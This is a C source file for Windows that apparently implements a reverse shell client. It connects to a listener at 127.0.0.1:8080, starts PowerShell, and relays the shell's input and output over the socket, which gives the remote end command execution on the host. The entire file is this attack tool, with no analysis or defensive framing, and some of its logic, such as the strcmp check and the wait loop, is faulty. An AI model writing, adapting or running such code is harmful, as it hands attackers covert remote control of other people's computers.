#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>

#include <WinSock2.h>
#include <Windows.h>

#pragma comment(lib, "Ws2_32.lib")

#define BUFSIZE 4096

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

DWORD WINAPI ReadProc(LPVOID param) {
	SOCKET sock = (SOCKET)param;

	DWORD bytesRead;
	DWORD bytesToRead;
	char inbuf[4096] = { 0 };

	while (1) {

		if (!PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &bytesToRead, NULL)) {
			printf("Error : PeekNamedPipe : %d\n", GetLastError());
		}

		if (!ReadFile(g_hChildStd_OUT_Rd, &inbuf, bytesToRead + 1, &bytesRead, NULL)) {
			printf("Error : ReadFile : %d\n", GetLastError());
			DWORD err = GetLastError();
			if (err == ERROR_BROKEN_PIPE)
				break;
		}
		if (bytesRead > 0) {
			send(sock, inbuf, bytesRead, 0);
		}
		memset(inbuf, 0, sizeof(inbuf));
	}
	return 0;
}

int main() {

	SOCKET sock = INVALID_SOCKET;

	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	SOCKADDR_IN addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(8080);

	int err = connect(sock, (SOCKADDR*)&addr, sizeof(addr));
	if (err == SOCKET_ERROR) {
		printf("ERROR : connect : %d\n", WSAGetLastError());
	}

	int rv;
	char recvbuf[BUFSIZE] = { 0 };

	const char req[] = "client";
	send(sock, req, strlen(req), 0);

	rv = recv(sock, recvbuf, sizeof(recvbuf), 0);
	while (1) {
		if (rv > 0) {
			if (strcmp(recvbuf, "req1")) {
				break;
			}
		}
		Sleep(10);
	}


	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0))
		printf("StdoutRd CreatePipe");

	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
		printf("Stdout SetHandleInformation");

	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &sa, 0))
		printf("Stdin CreatePipe");

	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
		printf("Stdin SetHandleInformation");

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	si.hStdError = g_hChildStd_OUT_Wr;
	si.hStdOutput = g_hChildStd_OUT_Wr;
	si.hStdInput = g_hChildStd_IN_Rd;
	si.dwFlags |= STARTF_USESTDHANDLES;

	err = CreateProcessA("C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	if (err == 0) {
		printf("ERROR : CreateProcess : %d\n", GetLastError());
		return 1;
	}

	CloseHandle(g_hChildStd_OUT_Wr);
	CloseHandle(g_hChildStd_IN_Rd);


	CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)ReadProc, (LPVOID)sock, 0, nullptr);

	DWORD bytesWrite;

	do {
		rv = recv(sock, recvbuf, sizeof(recvbuf), 0);
		if (rv > 0) {
			if (!WriteFile(g_hChildStd_IN_Wr, &recvbuf, rv, &bytesWrite, NULL)) {
				printf("Error : WriteFile : %d\n", GetLastError());
			}	
		}
		else if (rv == 0) {
			printf("Connection closed\n");
		}
		else {
			printf("recv failed: %d\n", WSAGetLastError());
		}
		memset(recvbuf, 0, sizeof(recvbuf));
	} while (rv > 0);
	return 0;
}